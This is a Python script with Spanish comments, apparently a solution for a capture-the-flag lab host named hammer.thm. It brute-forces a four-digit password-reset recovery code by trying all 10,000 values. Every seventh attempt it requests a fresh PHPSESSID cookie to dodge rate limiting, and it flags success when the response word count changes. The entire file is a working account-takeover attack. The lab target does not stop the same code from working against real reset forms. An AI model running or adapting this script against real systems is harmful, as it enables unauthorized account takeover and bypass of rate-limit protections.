

import requests

def get_phpsessid(session):
    # Realiza la petición de reseteo de contraseña y obtiene la cookie PHPSESSID
    url = "http://hammer.thm:1337/reset_password.php"
    data = {"email": "tester@hammer.thm"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    session.post(url, data=data, headers=headers, allow_redirects=False)
    phpsessid = session.cookies.get("PHPSESSID")
    print(f"[INFO] Solicitado nuevo PHPSESSID: {phpsessid}")
    return phpsessid

def submit_recovery_code(session, phpsessid, recovery_code):
    # Envía el código de recuperación usando la cookie PHPSESSID
    url = "http://hammer.thm:1337/reset_password.php"
    data = {"recovery_code": recovery_code, "s": "180"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    cookies = {"PHPSESSID": phpsessid}
    response = session.post(url, data=data, headers=headers, cookies=cookies)
    print(f"[INFO] Probando código: {recovery_code} | PHPSESSID: {phpsessid} | Palabras en respuesta: {len(response.text.split())}")
    return response.text

def main():
    session = requests.Session()
    phpsessid = get_phpsessid(session)
    if not phpsessid:
        print("[ERROR] No se pudo obtener el PHPSESSID inicial. Saliendo...")
        return

    for i in range(10000):
        recovery_code = f"{i:04d}"

        if i % 7 == 0:
            phpsessid = get_phpsessid(session)
            if not phpsessid:
                print(f"[ERROR] No se pudo obtener PHPSESSID en el intento {i}. Reintentando...")
                continue

        response_text = submit_recovery_code(session, phpsessid, recovery_code)
        word_count = len(response_text.split())

        if word_count != 148:
            print(f"[SUCCESS] ¡Código correcto!: {recovery_code}")
            print(f"[SUCCESS] PHPSESSID: {phpsessid}")
            print(f"[SUCCESS] Respuesta del servidor:\n{response_text}")
            break

        # Opcional: para no saturar el servidor
        # time.sleep(0.1)

if __name__ == "__main__":
    main()